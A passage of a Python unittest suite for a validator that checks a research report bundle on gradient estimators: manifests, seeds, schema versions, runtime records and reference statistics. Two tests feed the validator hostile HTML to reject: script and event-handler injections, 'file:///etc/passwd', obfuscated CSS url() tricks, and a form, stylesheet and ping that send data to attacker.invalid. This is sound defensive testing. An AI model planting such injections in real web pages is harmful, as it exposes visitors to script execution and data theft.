            "_validate_protocol",
            side_effect=validate_protocol_after_swap,
        ):
            with self.assertRaisesRegex(ValidationError, "PNG|signature|image"):
                validate_publication(root)

        self.assertEqual(asset.read_bytes(), PNG_BYTES)

    def test_schema_version_two_is_required_for_every_bundle_layer(self):
        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        summary = json.loads((root / "data/summary.json").read_text(encoding="utf-8"))
        raw = json.loads(
            (root / "data/raw/references.json").read_text(encoding="utf-8")
        )
        self.assertEqual(manifest["schema_version"], SCHEMA_VERSION)
        self.assertEqual(summary["schema_version"], SCHEMA_VERSION)
        self.assertEqual(raw["schema_version"], SCHEMA_VERSION)

        cases = (
            ("data/manifest.json", 1, False),
            ("data/manifest.json", 2.0, False),
            ("data/summary.json", 1, True),
            ("data/summary.json", 2.0, True),
            ("data/raw/references.json", 1, True),
            ("data/raw/references.json", 2.0, True),
            ("data/plot_data/validity.json", 1, True),
            ("data/plot_data/validity.json", 2.0, True),
        )
        for relative, schema_version, refresh in cases:
            with self.subTest(relative=relative, schema_version=schema_version):
                root = make_valid_fixture(self)
                path = root / relative
                payload = json.loads(path.read_text(encoding="utf-8"))
                payload["schema_version"] = schema_version
                write_fixture_json(path, payload)
                if refresh:
                    _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, "schema_version.*2"):
                    validate_publication(root)

    def test_v2_reference_count_decision_validation_fails_closed_if_unconfigured(self):
        root = make_valid_fixture(self)
        with mock.patch.object(
            validate_report_module, "_V2_REPORT_REFERENCE_COUNT_DECISION", None
        ):
            with self.assertRaisesRegex(
                ValidationError, "v2.*decision.*unavailable|clean.*pilot"
            ):
                validate_publication(root)

    def test_real_v2_reference_count_decision_is_bound_exactly(self):
        root = make_valid_fixture(self)
        self.assertTrue(
            validate_report_module._json_type_strict_equal(
                validate_report_module._V2_REPORT_REFERENCE_COUNT_DECISION,
                REAL_V2_REPORT_REFERENCE_COUNT_DECISION,
            )
        )
        validate_publication(root)

    def test_canonical_path_seed_pairs_do_not_split_stochastic_strata(self):
        root = make_valid_fixture(self)
        path = json.loads(
            (root / "data/raw/path_tracer_gradients.json").read_text(encoding="utf-8")
        )
        rows = [
            row
            for row in path["rows"]
            if row.get("method")
            in {
                "smoothed_pathwise",
                "score",
                "smoothed_crn_fd",
                "residual_control_variate",
            }
        ]
        for method in (
            "smoothed_pathwise",
            "score",
            "smoothed_crn_fd",
            "residual_control_variate",
        ):
            for samples in REPORT_CONFIG["smoothing_samples"]:
                selected = [
                    row
                    for row in rows
                    if row["method"] == method and row["samples"] == samples
                ]
                self.assertEqual(len(selected), 32)
                self.assertEqual(
                    [(row["outer_seed"], row["inner_seed"]) for row in selected],
                    [(10000 + index, 1000 + index) for index in range(32)],
                )
                self.assertEqual(
                    len({row["config"]["inner_random_digest"] for row in selected}),
                    32,
                )

        validate_publication(root)

    def test_opaque_estimator_rows_do_not_repeat_diagnostic_scope_fields(self):
        root = make_valid_fixture(self)
        opaque = json.loads(
            (root / "data/raw/opaque_mesh.json").read_text(encoding="utf-8")
        )["rows"]
        diagnostics = [row for row in opaque if row.get("method") is None]
        estimators = [row for row in opaque if row.get("method") is not None]
        self.assertEqual(len(diagnostics), 1)
        self.assertTrue(estimators)
        self.assertEqual(diagnostics[0]["transform_status"], "estimator_only")
        self.assertIs(diagnostics[0]["transformable"], False)
        self.assertTrue(
            all(
                "transform_status" not in row and "transformable" not in row
                for row in estimators
            )
        )

        validate_publication(root)

    def test_report_reference_count_decision_is_exact_and_immutable(self):
        cases = (
            ("missing", None),
            ("status", "pending_pilot"),
            ("protocol_fingerprint", "0" * 64),
            ("pilot_manifest_sha256", "0" * 64),
            ("pilot_source_commit", "0" * 40),
            ("pilot_projected_report_seconds", 1.0),
            ("decided_at_utc", "2026-06-28T14:43:55Z"),
            ("path_reference_samples", 32768.0),
            ("contact_reference_samples", 65535),
            ("reference_seed_sets", 3),
            ("rationale", ""),
        )
        for field, value in cases:
            with self.subTest(field=field):
                root = make_valid_fixture(self)
                manifest_path = root / "data/manifest.json"
                manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
                if field == "missing":
                    del manifest["report_reference_count_decision"]
                else:
                    manifest["report_reference_count_decision"][field] = value
                write_fixture_json(manifest_path, manifest)

                with self.assertRaisesRegex(
                    ValidationError,
                    "decision|pilot|protocol fingerprint|reference count",
                ):
                    validate_publication(root)

    def test_report_config_is_bound_to_the_accepted_protocol_fingerprint(self):
        cases = (
            ("width", 23),
            ("height", 15),
            ("spp", 1),
            ("bounces", 2),
            ("smoothing_samples", [8, 16, 32, 128, 64]),
            ("optimization_steps", 63),
            ("optimization_schedules", 15),
        )
        for field, value in cases:
            with self.subTest(field=field):
                root = make_valid_fixture(self)
                manifest_path = root / "data/manifest.json"
                manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
                manifest["config"][field] = value
                write_fixture_json(manifest_path, manifest)

                with self.assertRaisesRegex(
                    ValidationError, "config|protocol|decision|fingerprint"
                ):
                    validate_publication(root)

    def test_published_runtime_requires_the_complete_installed_measurement(self):
        cases = (
            "missing",
            "staging_measurement",
            "exclusions",
            "zero_finalization",
            "finalization_mismatch",
            "zero_installation",
            "installation_mismatch",
            "missing_phase",
            "projection_factor",
            "projection_model",
            "projected_seconds",
            "boolean_duration",
        )
        for case in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                summary_path = root / "data/summary.json"
                summary = json.loads(summary_path.read_text(encoding="utf-8"))
                runtime = summary["runtime"]
                if case == "missing":
                    del summary["runtime"]
                elif case == "staging_measurement":
                    runtime["elapsed_measurement"] = (
                        "through_one_complete_final_write_hash_validation_pass"
                    )
                elif case == "exclusions":
                    runtime["measurement_excludes"] = ["metadata_rewrite"]
                elif case == "zero_finalization":
                    runtime["measured_finalization_pass_seconds"] = 0.0
                    runtime["phase_seconds"]["finalization"] = 0.0
                elif case == "finalization_mismatch":
                    runtime["measured_finalization_pass_seconds"] += 1.0
                elif case == "zero_installation":
                    runtime["measured_installation_pass_seconds"] = 0.0
                    runtime["phase_seconds"]["installation"] = 0.0
                elif case == "installation_mismatch":
                    runtime["measured_installation_pass_seconds"] += 1.0
                elif case == "missing_phase":
                    del runtime["phase_seconds"]["installation"]
                elif case == "projection_factor":
                    runtime["projection_factors"]["installation"] = 2.0
                elif case == "projection_model":
                    runtime["projection_model"] = "unrecorded_projection"
                elif case == "projected_seconds":
                    runtime["projected_report_seconds"] += 1.0
                else:
                    runtime["elapsed_seconds"] = True
                write_fixture_json(summary_path, summary)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    ValidationError,
                    "runtime|installation|elapsed|phase|projection|measurement",
                ):
                    validate_publication(root)

    def test_path_numerical_gauge_contract_is_exact_and_certificate_bound(self):
        cases = (
            "missing_protocol",
            "target",
            "target_label",
            "unbiased_target",
            "row_gauge_sites",
            "config_policy",
            "config_bounds",
            "control_fingerprint",
            "control_forward_mismatch",
            "certificate_site_count",
            "coherent_forged_fingerprint",
            "callable_projection",
            "nonresidual_gauge_claim",
            "nonpath_claim",
        )
        for case in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path_file = root / "data/raw/path_tracer_gradients.json"
                payload = json.loads(path_file.read_text(encoding="utf-8"))
                protocol = next(
                    row
                    for row in payload["rows"]
                    if row.get("scenario") == "path_randomness_protocol"
                )
                residuals = [
                    row
                    for row in payload["rows"]
                    if row.get("method") == "residual_control_variate"
                ]
                residual = residuals[0]
                if case == "missing_protocol":
                    payload["rows"].remove(protocol)
                    summary_path = root / "data/summary.json"
                    summary = json.loads(summary_path.read_text(encoding="utf-8"))
                    validity = next(
                        row
                        for row in summary["scenario_validity"]
                        if row["scenario"] == "path_tracer"
                    )
                    validity["source_row_ids"].remove(protocol["row_id"])
                    validity["metrics"]["row_count"] -= 1
                    validity["metrics"]["accepted_count"] -= 1
                    write_fixture_json(summary_path, summary)
                elif case == "target":
                    for row in residuals:
                        row["target"] = "gaussian_smoothed_hard"
                elif case == "target_label":
                    residual["target_label"] = "unqualified residual target"
                elif case == "unbiased_target":
                    residual["unbiased_target"] = False
                elif case == "row_gauge_sites":
                    residual["numerical_gauge_sites"] = 4
                elif case == "config_policy":
                    for row in residuals:
                        row["config"]["numerical_gauge_policy"] = "smoothed"
                elif case == "config_bounds":
                    for row in residuals:
                        row["config"]["parameter_upper"] = [0.8, 0.5, 0.4]
                elif case == "control_fingerprint":
                    protocol["control_variate"]["certificate_fingerprint"] = "0" * 64
                elif case == "control_forward_mismatch":
                    protocol["control_variate"]["soft_forward_executions"] = 16
                elif case == "certificate_site_count":
                    protocol["certificate"]["numerical_gauge_sites"] = 4
                elif case == "coherent_forged_fingerprint":
                    forged = "0" * 64
                    protocol["certificate"]["fingerprint"] = forged
                    protocol["control_variate"]["certificate_fingerprint"] = forged
                    for row in residuals:
                        row["certificate_fingerprint"] = forged
                elif case == "callable_projection":
                    protocol["certificate"]["callable_keys"] = protocol["certificate"][
                        "callable_keys"
                    ][:-1]
                elif case == "nonresidual_gauge_claim":
                    score = next(
                        row for row in payload["rows"] if row.get("method") == "score"
                    )
                    score["numerical_gauge_assumption"] = True
                    score["numerical_gauge_sites"] = 5
                else:
                    analytic_path = root / "data/raw/analytic.json"
                    analytic = json.loads(analytic_path.read_text(encoding="utf-8"))
                    analytic["rows"][0]["target"] = PATH_GAUGE_TARGET
                    analytic["rows"][0]["numerical_gauge_assumption"] = True
                    analytic["rows"][0]["numerical_gauge_sites"] = 5
                    write_fixture_json(analytic_path, analytic)
                write_fixture_json(path_file, payload)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    ValidationError, "path|gauge|certificate|target|protocol"
                ):
                    validate_publication(root)

    def test_path_optimization_protocol_is_exact_and_complete(self):
        cases = (
            "missing_identity",
            "duplicate_identity",
            "unknown_method",
            "schedule",
            "estimator_seeds",
            "target_seed",
            "held_out_seed",
            "source_commit",
            "device",
            "accepted",
            "success",
            "final_recheck",
            "recheck_seed",
            "recheck_protocol",
            "held_out_evaluations",
            "render_work",
            "objective_extension",
            "gauge_policy",
            "box_constraints",
            "loss_work",
            "parameter_work",
            "gradient_work",
        )
        for case in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path = root / "data/raw/path_tracer_optimization.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                row = payload["rows"][0]
                if case == "missing_identity":
                    payload["rows"].pop()
                elif case == "duplicate_identity":
                    payload["rows"][-1]["method"] = row["method"]
                    payload["rows"][-1]["schedule_id"] = row["schedule_id"]
                elif case == "unknown_method":
                    row["method"] = "unknown"
                elif case == "schedule":
                    row["schedule_id"] = 16
                elif case == "estimator_seeds":
                    row["estimator_seeds"][0] += 1
                elif case == "target_seed":
                    row["target_seed"] += 1
                elif case == "held_out_seed":
                    row["held_out_seed"] += 1
                elif case == "source_commit":
                    row["source_commit"] = "2" * 40
                elif case == "device":
                    row["device"] = "cuda:0"
                elif case == "accepted":
                    row["accepted"] = False
                elif case == "success":
                    row["success"] = False
                elif case == "final_recheck":
                    row["deterministic_final_recheck"] += 0.25
                elif case == "recheck_seed":
                    row["final_recheck_seed"] += 1
                elif case == "recheck_protocol":
                    row["final_recheck_protocol"] = "fresh_target"
                elif case == "held_out_evaluations":
                    row["held_out_render_evaluations"] -= 1
                elif case == "render_work":
                    row["held_out_render_work"]["total_renders"] -= 1
                elif case == "objective_extension":
                    row["objective_extension"] = "unbounded"
                elif case == "gauge_policy":
                    row["numerical_gauge_policy"] = "smoothed"
                elif case == "box_constraints":
                    row["box_constraints"]["upper"][0] = 0.7
                elif case == "loss_work":
                    row["losses"].pop()
                elif case == "parameter_work":
                    row["parameters"].pop()
                else:
                    row["gradients"].pop()
                write_fixture_json(path, payload)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    ValidationError,
                    "path optimization|path-tracer optimization",
                ):
                    validate_publication(root)

    def test_path_inner_random_digest_is_global_by_inner_seed(self):
        cases = (
            ("cross_method", "score", 8, "f" * 64),
            ("cross_sample_count", "score", 16, "e" * 64),
        )
        for case, method, samples, forged_digest in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path = root / "data/raw/path_tracer_gradients.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                row = next(
                    record
                    for record in payload["rows"]
                    if record.get("method") == method
                    and record.get("samples") == samples
                    and record.get("inner_seed") == 1000
                )
                row["config"]["inner_random_digest"] = forged_digest
                write_fixture_json(path, payload)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    ValidationError,
                    "inner_seed|inner-random digest|inner random digest",
                ):
                    validate_publication(root)

    def test_manifest_source_seed_tree_is_exact(self):
        cases = ("missing_domain", "path_training", "contact_optimization")
        for case in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path = root / "data/manifest.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                seeds = payload["source"]["seeds"]
                if case == "missing_domain":
                    del seeds["triangle_estimator_outer"]
                elif case == "path_training":
                    seeds["path_tracer"]["training"][0] = 999
                else:
                    seeds["contact_3d"]["optimization_outer"][0] += 1
                write_fixture_json(path, payload)

                with self.assertRaisesRegex(
                    ValidationError, "source.*seed|seed.*protocol|canonical.*seed"
                ):
                    validate_publication(root)

    def test_path_gradient_rows_require_deterministic_coverage_and_exact_configs(self):
        cases = (
            "missing_deterministic",
            "crisp_fd_epsilon",
            "smoothed_crn_fd_epsilon",
            "non_fd_epsilon",
            "common_config",
        )
        for case in cases:
            with self.subTest(case=case):
                root = make_valid_fixture(self)
                path = root / "data/raw/path_tracer_gradients.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                if case == "missing_deterministic":
                    index = next(
                        index
                        for index, row in enumerate(payload["rows"])
                        if row.get("method") == "crisp_ad"
                        and row.get("scenario_family") == "path_tracer"
                    )
                    payload["rows"].pop(index)
                else:
                    method, samples = {
                        "crisp_fd_epsilon": ("crisp_fd", 1),
                        "smoothed_crn_fd_epsilon": ("smoothed_crn_fd", 8),
                        "non_fd_epsilon": ("score", 8),
                        "common_config": ("score", 8),
                    }[case]
                    selected = [
                        record
                        for record in payload["rows"]
                        if record.get("method") == method
                        and record.get("samples") == samples
                    ]
                    if case in {"crisp_fd_epsilon", "smoothed_crn_fd_epsilon"}:
                        for row in selected:
                            row["config"]["epsilon"] = None
                    elif case == "non_fd_epsilon":
                        for row in selected:
                            row["config"]["epsilon"] = 0.01
                    else:
                        for row in selected:
                            row["config"]["paths_per_forward"] -= 1
                write_fixture_json(path, payload)
                _refresh_manifest(root)

                with self.assertRaisesRegex(
                    ValidationError,
                    "path.*gradient|path.*config|path.*method|deterministic|epsilon",
                ):
                    validate_publication(root)

    def test_missing_manifest_is_rejected(self):
        root = make_valid_fixture(self)
        (root / "data/manifest.json").unlink()
        with self.assertRaisesRegex(ValidationError, "manifest"):
            validate_publication(root)

    def test_missing_or_changed_declared_artifact_is_rejected(self):
        root = make_valid_fixture(self)
        target = root / "assets/images/path_target.png"
        target.unlink()
        with self.assertRaisesRegex(ValidationError, "path_target"):
            validate_publication(root)

        root = make_valid_fixture(self)
        target = root / "data/raw/analytic.json"
        target.write_text(target.read_text(encoding="utf-8") + " ", encoding="utf-8")
        with self.assertRaisesRegex(ValidationError, "analytic.json"):
            validate_publication(root)

    def test_undeclared_artifact_is_rejected(self):
        root = make_valid_fixture(self)
        (root / "assets/figures/secret.png").write_bytes(b"undeclared")
        with self.assertRaisesRegex(ValidationError, "undeclared"):
            validate_publication(root)

    def test_symlinked_root_directory_and_artifact_are_rejected(self):
        root = make_valid_fixture(self)
        link = root.parent / f"{root.name}-link"
        link.symlink_to(root, target_is_directory=True)
        self.addCleanup(link.unlink, missing_ok=True)
        with self.assertRaisesRegex(ValidationError, "symbolic link"):
            validate_publication(link)

        root = make_valid_fixture(self)
        path = root / "assets/images/path_target.png"
        target = root / "path-target-real.png"
        target.write_bytes(path.read_bytes())
        path.unlink()
        path.symlink_to(target)
        with self.assertRaisesRegex(ValidationError, "symlink|symbolic"):
            validate_publication(root)

    def test_missing_required_section_is_rejected(self):
        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8").replace(
                'id="path-tracing"', 'id="removed"'
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "path-tracing"):
            validate_publication(root)

    def test_missing_method_label_and_legacy_reference_are_rejected(self):
        root = make_valid_fixture(self)
        page = root / "index.html"
        source = page.read_text(encoding="utf-8")
        if 'data-method="score"' not in source:
            self.fail("canonical report is missing score method labels")
        page.write_text(
            source.replace('data-method="score"', 'data-method="removed"'),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "score"):
            validate_publication(root)

        root = make_valid_fixture(self)
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8") + '<img src="triangle_gradients.png">',
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "legacy"):
            validate_publication(root)

    def test_executable_external_and_unmanifested_html_references_are_rejected(self):
        for reference in (
            "javascript:alert(1)",
            "data:text/html,unsafe",
            "file:///etc/passwd",
            "C:/private/image.png",
            "//attacker.invalid/image.png",
        ):
            with self.subTest(reference=reference):
                root = make_valid_fixture(self)
                page = root / "index.html"
                page.write_text(
                    page.read_text(encoding="utf-8")
                    + f'<a href="{reference}">unsafe</a>',
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError, "scheme|reference|filesystem"
                ):
                    validate_publication(root)

        root = make_valid_fixture(self)
        (root / "evil.png").write_bytes(b"not declared")
        page = root / "index.html"
        page.write_text(
            page.read_text(encoding="utf-8") + '<img src="evil.png">', encoding="utf-8"
        )
        with self.assertRaisesRegex(ValidationError, "declared|manifest"):
            validate_publication(root)

    def test_sections_must_be_sections_and_method_labels_must_be_visible(self):
        root = make_valid_fixture(self)
        page = root / "index.html"
        source = page.read_text(encoding="utf-8")
        if '<section id="scope">' not in source:
            self.fail("canonical report is missing the scope section")
        page.write_text(
            source.replace('<section id="scope">', '<div id="scope">', 1),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "scope"):
            validate_publication(root)

        root = make_valid_fixture(self)
        page = root / "index.html"
        source = page.read_text(encoding="utf-8")
        score_label = '<span class="method" data-method="score">score</span>'
        if score_label not in source:
            self.fail("canonical report is missing rendered score labels")
        page.write_text(
            source.replace(
                score_label,
                '<span class="method" data-method="score" '
                'style="display:none">score</span>',
            ),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "score"):
            validate_publication(root)

        root = make_valid_fixture(self)
        page = root / "index.html"
        source = page.read_text(encoding="utf-8")
        if '<section id="scope">' not in source:
            self.fail("canonical report is missing the scope section")
        page.write_text(
            source.replace('<section id="scope">', '<section id="scope" hidden>', 1),
            encoding="utf-8",
        )
        with self.assertRaisesRegex(ValidationError, "scope|empty"):
            validate_publication(root)

    def test_active_html_and_untracked_resource_attributes_are_rejected(self):
        snippets = (
            '<script>alert("unsafe")</script>',
            '<button onclick="alert(1)">unsafe</button>',
            '<img src="assets/images/path_target.png" srcset="evil.png 2x">',
            '<link rel="stylesheet" href="https://attacker.invalid/x.css">',
            '<base href="https://attacker.invalid/">',
            '<meta http-equiv="refresh" content="0;url=https://attacker.invalid">',
            "<style>@import url(https://attacker.invalid/x.css)</style>",
            "<style>body{background:url(evil.png)}</style>",
            r"<style>body{background:u\72l(evil.png)}</style>",
            r'<div style="background:u\72l(evil.png)">x</div>',
            '<style>body{background:image-set("evil.png" 1x)}</style>',
            "<style>body{background:u/**/rl(evil.png)}</style>",
            '<form action="https://attacker.invalid/collect"></form>',
            '<video poster="evil.png"></video>',
            '<a href="https://example.com" ping="https://attacker.invalid/ping">x</a>',
        )
        for snippet in snippets:
            with self.subTest(snippet=snippet):
                root = make_valid_fixture(self)
                page = root / "index.html"
                page.write_text(
                    page.read_text(encoding="utf-8") + snippet, encoding="utf-8"
                )
                with self.assertRaisesRegex(
                    ValidationError, "active|unsafe|attribute|element|filesystem"
                ):
                    validate_publication(root)

    def test_duplicate_html_attributes_are_rejected_before_mapping(self):
        snippets = (
            '<a href="javascript:alert(1)" href="https://example.com">unsafe</a>',
            '<a HREF="javascript:alert(1)" href="https://example.com">unsafe</a>',
        )
        for snippet in snippets:
            with self.subTest(snippet=snippet):
                root = make_valid_fixture(self)
                page = root / "index.html"
                page.write_text(
                    page.read_text(encoding="utf-8") + snippet,
                    encoding="utf-8",
                )
                with self.assertRaisesRegex(
                    ValidationError, "duplicate.*attribute|attribute.*duplicate"
                ):
                    validate_publication(root)

    def test_dirty_or_local_source_provenance_is_rejected(self):
        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["source"]["dirty"] = True
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "clean"):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        manifest["source"]["command"].append("/tmp/private/results")
        write_fixture_json(root / "data/manifest.json", manifest)
        with self.assertRaisesRegex(ValidationError, "local filesystem"):
            validate_publication(root)

    def test_stochastic_coverage_and_work_accounting_are_enforced(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        removed = next(
            index
            for index, row in enumerate(payload["rows"])
            if row.get("method") == "score"
            and row.get("samples") == 8
            and row.get("outer_seed") == 10031
        )
        payload["rows"].pop(removed)
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "32.*distinct outer seeds|exactly 32 rows"
        ):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["independent_contributions"] = 8
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "independent_contributions|accounting"
        ):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["config"]["smoothing_samples"] = [8, 16]
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "N=16|sample"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["antithetic"] = False
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "antithetic|accounting"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["outer_seed"] = -1
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "outer_seed"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/analytic.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        residual = next(
            row
            for row in payload["rows"]
            if row["method"] == "residual_control_variate"
        )
        residual["parameter_perturbations"] = 999
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(
            ValidationError, "parameter_perturbations|accounting"
        ):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest_path = root / "data/manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        manifest["applicability"].append(dict(manifest["applicability"][0]))
        write_fixture_json(manifest_path, manifest)
        with self.assertRaisesRegex(ValidationError, "duplicate"):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        manifest["applicability"] = [
            cell
            for cell in manifest["applicability"]
            if not (cell["scenario"] == "contact_3d" and cell["method"] == "score")
        ]
        write_fixture_json(root / "data/manifest.json", manifest)
        with self.assertRaisesRegex(ValidationError, "contact_3d|matrix"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        duplicate = dict(payload["rows"][0])
        duplicate["row_id"] = "path:score:duplicate"
        payload["rows"].append(duplicate)
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "duplicate|32"):
            validate_publication(root)

    def test_performance_rows_are_numerically_validated(self):
        mutations = (
            ("wall_time", -0.1),
            ("forward_executions", -1),
            ("backward_executions", "zero"),
        )
        for field, value in mutations:
            with self.subTest(field=field):
                root = make_valid_fixture(self)
                path = root / "data/raw/performance.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                payload["rows"][0][field] = value
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, field):
                    validate_publication(root)

        for field in (
            "cold_compile_time",
            "warm_median",
            "warm_iqr",
            "warm_repeats",
            "tracemalloc_peak_available",
            "source_commit",
        ):
            with self.subTest(missing=field):
                root = make_valid_fixture(self)
                path = root / "data/raw/performance.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                del payload["rows"][0][field]
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, field):
                    validate_publication(root)

    def test_references_lineage_and_opaque_scope_are_enforced(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["accepted"]["references"] = False
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "accepted reference"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/raw/opaque_mesh.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["transform_status"] = "transformed"
        payload["rows"][0]["transformable"] = True
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "estimator-only"):
            validate_publication(root)

        root = make_valid_fixture(self)
        path = root / "data/plot_data/gradient_quality.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["source_row_ids"] = ["missing:row"]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "missing:row"):
            validate_publication(root)

    def test_reference_richardson_policy_intervals_and_diagnostics_are_exact(self):
        mutations = (
            (
                "policy value",
                lambda row: row["truncation_policy"].__setitem__("richardson_order", 3),
                "truncation policy",
            ),
            (
                "policy extra key",
                lambda row: row["truncation_policy"].__setitem__("extra", True),
                "truncation policy",
            ),
            (
                "fine error interval",
                lambda row: row["intervals"]["fine_truncation_error"][
                    "mean"
                ].__setitem__(0, 1.0),
                "fine_truncation_error.*mean|stored replicates",
            ),
            (
                "Richardson interval",
                lambda row: row["intervals"]["richardson"]["mean"].__setitem__(0, 2.0),
                "richardson.*mean|stored replicates",
            ),
            (
                "truncation diagnostic",
                lambda row: row["diagnostics"]["truncation_upper_bound"].__setitem__(
                    0, 1.0
                ),
                "diagnostics|truncation",
            ),
            (
                "statistical budget",
                lambda row: row["diagnostics"][
                    "truncation_statistical_budget"
                ].__setitem__(0, 1.0),
                "diagnostics|truncation",
            ),
            (
                "roundoff floor",
                lambda row: row["diagnostics"]["truncation_roundoff_floor"].__setitem__(
                    0, 0.0
                ),
                "diagnostics|truncation",
            ),
            (
                "effective budget",
                lambda row: row["diagnostics"][
                    "truncation_effective_budget"
                ].__setitem__(0, 0.0),
                "diagnostics|truncation",
            ),
            (
                "floor dominated",
                lambda row: row["diagnostics"][
                    "truncation_floor_dominated"
                ].__setitem__(0, False),
                "diagnostics|truncation",
            ),
            (
                "truncation components",
                lambda row: row["diagnostics"]["truncation_components"].__setitem__(
                    0, False
                ),
                "diagnostics|truncation",
            ),
            (
                "truncation acceptance",
                lambda row: row["accepted"].__setitem__(
                    "truncation_error_controlled", False
                ),
                "acceptance flags|truncation",
            ),
            (
                "acceptance extra key",
                lambda row: row["accepted"].__setitem__("extra", True),
                "acceptance flags|accepted keys",
            ),
            (
                "paired-zero publication reason",
                lambda row: row["reasons"].append(
                    "paired-zero consistency is required for publication"
                ),
                "reasons|audit-only|publication gates",
            ),
        )
        for name, mutate, message in mutations:
            with self.subTest(name=name):
                root = make_valid_fixture(self)
                path = root / "data/raw/references.json"
                payload = json.loads(path.read_text(encoding="utf-8"))
                mutate(payload["rows"][0])
                write_fixture_json(path, payload)
                _refresh_manifest(root)
                with self.assertRaisesRegex(ValidationError, message):
                    validate_publication(root)

    def test_richardson_mean_and_score_overlap_define_the_published_reference(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/references.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        row = payload["rows"][0]
        dimension = len(row["parameters"])
        h2_value = 1.0
        refinement_power = (
            REFERENCE_POLICY.refinement_ratio**REFERENCE_POLICY.richardson_order
        )
        h_value = h2_value - refinement_power * sys.float_info.epsilon
        richardson_denominator = (
            REFERENCE_POLICY.refinement_ratio**REFERENCE_POLICY.richardson_order - 1
        )
        error = (h_value - h2_value) / richardson_denominator
        richardson_value = h2_value - error
        row["g_h"] = [[h_value] * dimension for _ in range(REFERENCE_POLICY.replicates)]
        row["g_h2"] = [
            [h2_value] * dimension for _ in range(REFERENCE_POLICY.replicates)
        ]
        row["score"] = [
            [richardson_value] * dimension for _ in range(REFERENCE_POLICY.replicates)
        ]
        _populate_reference_evidence(row)
        self.assertLess(
            row["intervals"]["g_h2"]["ci_high"][0],
            row["intervals"]["score"]["ci_low"][0],
        )
        self.assertTrue(row["accepted"]["fd_score_overlap"])
        self.assertTrue(row["accepted"]["truncation_error_controlled"])
        self.assertTrue(row["accepted"]["references"])
